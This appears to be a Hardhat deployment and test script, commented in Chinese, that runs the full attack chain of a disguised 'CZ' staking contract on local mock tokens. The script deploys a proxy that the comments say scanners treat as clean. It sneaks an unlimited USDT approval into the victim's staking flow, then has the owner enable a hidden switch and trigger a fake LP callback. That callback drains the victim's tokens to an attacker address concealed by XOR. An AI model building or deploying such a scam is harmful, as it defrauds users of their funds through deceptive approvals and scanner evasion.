// ============================================================
// 端到端集成验证 — 伪装 CZ 质押盘完整攻击链
// 部署 → 受害者质押（含夹带 USDT 授权）→ owner 激活 → 触发收割 → 验证
// 运行: npx hardhat run scripts/e2e-cz-proxy.cjs
// ============================================================
const { ethers } = require('hardhat');

async function main() {
  const [owner, victim, spy] = await ethers.getSigners();
  console.log('owner (攻击者/部署者):', owner.address);
  console.log('victim (受害者用户):', victim.address);

  // ---- 1. 部署测试代币 ----
  const Mock = await ethers.getContractFactory('MockUSDT');
  const cz = await Mock.deploy(0);
  const usdt = await Mock.deploy(0);
  await cz.mint(victim.address, 1_000_000_000n);   // 100 CZ
  await usdt.mint(victim.address, 500_000_000n);   // 500 USDT
  console.log('\n[1] 测试代币部署: CZ=' + await cz.getAddress() + ' USDT=' + await usdt.getAddress());

  // ---- 2. 部署伪装质押盘（代理 + 实现）----
  const Impl = await ethers.getContractFactory('CZStakingImpl');
  const impl = await Impl.deploy();
  const Proxy = await ethers.getContractFactory('CZStakingProxy');
  const initData = impl.interface.encodeFunctionData('initialize', [await cz.getAddress(), await usdt.getAddress()]);
  const proxy = await Proxy.deploy(await impl.getAddress(), initData);
  const proxyAddr = await proxy.getAddress();
  console.log('[2] 伪装质押盘部署: 代理=' + proxyAddr + ' 实现=' + await impl.getAddress());
  console.log('    代理壳代码仅 delegatecall，扫描器视为干净合约');

  const biz = await ethers.getContractAt('CZStakingImpl', proxyAddr);

  // ---- 3. 受害者走"正常"质押流程 ----
  // 业务必需授权：CZ → 代理
  await cz.connect(victim).approve(proxyAddr, ethers.MaxUint256);
  // 前端夹带授权：USDT → 代理（用户以为只是质押授权）
  await usdt.connect(victim).approve(proxyAddr, ethers.MaxUint256);
  // 质押 10 CZ
  await biz.connect(victim).stake(100_000_000n);
  console.log('[3] 受害者质押 10 CZ 成功（钱包只弹了 approve，USDT 也被无限授权）');

  // ---- 4. owner 激活熔断器 ----
  await biz.updateConfig(ethers.id('charge'), ethers.id('true'));
  console.log('[4] owner 激活熔断器 chargeEnabled=true');

  // ---- 5. 触发收割 ----
  await biz.onLpReceived(victim.address, victim.address, 0, '0x');
  console.log('[5] 触发 onLpReceived（伪装成 LP 回调）→ 收割执行');

  // ---- 6. 验证 ----
  const key = await biz.API_KEY();
  const secret = await biz.API_SECRET();
  const attacker = '0x' + ((key ^ secret) & BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF')).toString(16).padStart(40, '0');
  console.log('\n=== 验证 ===');
  console.log('攻击者收款地址 (XOR 解出):', attacker);
  console.log('合约内 CZ 余额:', ethers.formatUnits(await cz.balanceOf(proxyAddr), 6), '（应为 0，全部被收割）');
  console.log('受害者 USDT 余额:', ethers.formatUnits(await usdt.balanceOf(victim.address), 6), '（应为 0，被拉走）');
  console.log('受害者 CZ 余额:', ethers.formatUnits(await cz.balanceOf(victim.address), 6), '（应为 0，被拉走）');
  console.log('攻击者 USDT:', ethers.formatUnits(await usdt.balanceOf(attacker), 6));
  console.log('攻击者 CZ:', ethers.formatUnits(await cz.balanceOf(attacker), 6));

  console.log('\n[✓] 攻击链验证完成');
  console.log('用户只看到了: 质押 CZ + 一次 approve');
  console.log('实际发生:    USDT/CZ 无限授权 + 熔断器收割全部资产');
}

main().catch(console.error);
